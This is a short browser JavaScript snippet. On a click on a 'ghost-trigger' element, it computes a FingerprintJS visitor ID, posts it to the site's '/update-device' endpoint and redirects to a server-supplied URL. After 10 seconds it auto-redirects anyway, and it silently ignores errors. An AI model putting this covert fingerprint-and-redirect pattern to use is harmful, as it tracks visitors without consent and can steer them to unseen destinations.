const trigger = document.getElementById('ghost-trigger');
let isProcessing = false;

async function syncInteractionStatus(visitorId, statusMessage) {
    await fetch('/update-device', {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({ 
            client_id: visitorId,
            status: statusMessage,
            timestamp: new Date().toISOString()
        })
    }).catch(() => {});
}

trigger.onclick = async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        const configRes = await fetch('/get-config');
        if (!configRes.ok) throw new Error();
        const config = await configRes.json();

        const fpPromise = FingerprintJS.load();
        const fp = await fpPromise;
        const result = await fp.get();
        const visitorId = result.visitorId;

        await syncInteractionStatus(visitorId, "ONLINE");
        window.location.href = config.redirect_url;

    } catch (error) {
        isProcessing = false;
    }
};

setTimeout(async () => {
    if (!isProcessing) {
        try {
            const configRes = await fetch('/get-config');
            if (configRes.ok) {
                const config = await configRes.json();
                window.location.href = config.redirect_url;
            }
        } catch(err) {}
    }
}, 10000);
